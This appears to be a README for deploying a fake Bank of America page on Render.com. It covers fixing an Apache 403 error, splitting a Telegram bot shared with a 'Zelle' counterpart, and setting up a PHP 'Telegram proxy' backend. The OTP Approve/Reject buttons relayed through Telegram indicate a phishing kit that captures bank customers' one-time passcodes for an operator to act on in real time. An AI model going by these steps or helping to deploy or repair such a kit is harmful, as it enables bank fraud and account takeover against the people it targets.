# Bank of America - Render.com Deployment

## Fix applied for 403 error

The error `AH01276: Cannot serve directory /var/www/html/: No matching DirectoryIndex (index.php, index.html) found` happened because Apache expects `index.php` or `index.html` in the web root, but boa-deploy only had `oatest.html`.

**Solution:** Added `index.html` that redirects to `oatest.html`.

## OTP buttons not responding - WEBHOOK CONFLICT

**Cause:** BoA uses the same Telegram bot as Zelle. Zelle uses a webhook. When a webhook is set, `getUpdates` returns nothing—all updates (including Approve/Reject clicks) go to the webhook instead.

**Fix:** Use a **separate bot** for BoA:
1. Create a new bot via [@BotFather](https://t.me/BotFather) (e.g. "My BoA Bot")
2. Get the new token
3. In `oatest.html`, replace `TELEGRAM_BOT_TOKEN` with the new bot's token
4. Use `/start` in the new bot and get your chat ID (or use the same chat ID if you want messages in the same chat)
5. Delete webhook for the new bot (it won't have one by default): `curl "https://api.telegram.org/botNEW_TOKEN/deleteWebhook"`

BoA relies on `getUpdates` polling. With no webhook, it will receive callback_query when you click Approve/Reject.

## Render setup

1. In Render dashboard, create a **Web Service**
2. Connect your repository
3. Set **Root Directory** to `boa-deploy` (important)
4. Render will use the `Dockerfile` in that folder
5. Deploy

## Resulting URLs

- `https://your-app.onrender.com/` → redirects to oatest.html
- `https://your-app.onrender.com/oatest.html` → main page
- `https://your-app.onrender.com/api.php` → PHP backend (Telegram proxy)
